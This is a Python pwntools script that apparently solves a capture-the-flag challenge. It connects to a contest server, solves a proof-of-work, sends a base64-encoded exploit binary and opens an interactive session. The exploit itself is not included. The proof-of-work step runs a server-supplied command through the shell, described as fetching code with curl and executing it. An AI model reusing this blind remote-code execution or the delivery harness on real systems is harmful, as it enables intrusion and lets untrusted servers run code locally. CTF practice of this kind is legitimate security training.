from pwn import *
import base64
import subprocess

# Target server
HOST = "gzcli.techcomfest.1pc.tf"
PORT = 54883

# --- Proof-of-Work Solver ---
def solve_pow(r):
    try:
        log.info("Waiting for PoW prompt...")
        pow_data = r.recvuntil(b"Solution? ", timeout=5)
        if b"You can run the solver with:" not in pow_data:
            log.warning("Did not receive expected PoW prompt.")
            log.info(f"Received data: {pow_data.decode(errors='ignore')}")
            return

        pow_cmd_line = re.search(b"python3.*solve.*", pow_data).group(0).decode()
        log.info(f"Received PoW command: {pow_cmd_line}")

        # The command is something like: python3 <(curl ...) solve <challenge>
        # We can execute this using a shell.
        result = subprocess.run(pow_cmd_line, shell=True, capture_output=True, text=True, check=True, executable='/bin/bash')
        solution = result.stdout.strip()
        log.success(f"PoW solution found: {solution}")
        
        r.sendline(solution.encode())
        log.info("PoW solution sent.")

    except EOFError:
        log.failure("Connection closed unexpectedly while waiting for PoW. The server might be down or unstable.")
        exit(1)
    except Exception as e:
        log.failure(f"An error occurred during PoW: {e}")
        exit(1)


# --- Main Exploit Logic ---

# Read the compiled exploit binary
try:
    with open("exploit", "rb") as f:
        exploit_data = f.read()
except FileNotFoundError:
    log.failure("Compiled 'exploit' binary not found. Please compile it first.")
    exit(1)

# Base64 encode the exploit
encoded_exploit = base64.b64encode(exploit_data)

# Connect to the remote server
r = remote(HOST, PORT)

# Solve the Proof-of-Work
solve_pow(r)

# Now, the server should be ready for our exploit.
try:
    log.info("Waiting for payload prompt...")
    r.recvuntil(b"payload:\n", timeout=5) # Assuming a prompt like "Send your base64 payload:"

    log.info(f"Sending {len(encoded_exploit)} bytes of base64-encoded exploit...")
    r.sendline(encoded_exploit)

    log.info("Exploit sent. Waiting for output...")
    r.interactive()

except EOFError:
    log.failure("Connection closed after sending PoW. The server may have rejected the solution or crashed.")
    log.info("Attempting to print any remaining output...")
    print(r.recvall(timeout=2).decode(errors='ignore'))

except Exception as e:
    log.failure(f"An error occurred after PoW: {e}")

